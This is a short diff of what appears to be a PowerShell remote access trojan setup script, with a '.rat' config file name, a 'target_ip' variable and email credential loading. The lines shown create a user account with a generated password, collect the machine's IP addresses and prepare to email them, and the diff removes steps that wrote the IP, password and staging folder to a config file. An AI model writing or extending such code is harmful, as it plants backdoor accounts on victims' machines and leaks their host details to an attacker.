@@ -33,16 +33,11 @@ create_user -username $username -password $password
 $temp_folder = random_string
 $temp_folder_path = "$env:temp\$temp_folder"
 $current_dir = Get-Location
-$user_name = "$env:UserName.rat"
+$user_name = "$env:UserName"
 $your_email = Get-Content email.txt
 $email_password = Get-Content password.txt
-$target_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -ne '127.0.0.1' }).IPAddress
+$target_ip = (Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ", "
 
-
-# writes config file
-Add-Content -Path $user_name -Value $target_ip
-Add-Content -Path $user_name -Value $pass_gen_string
-Add-Content -Path $user_name -Value $temp_folder_path
 
 # Define email parameters
 '''
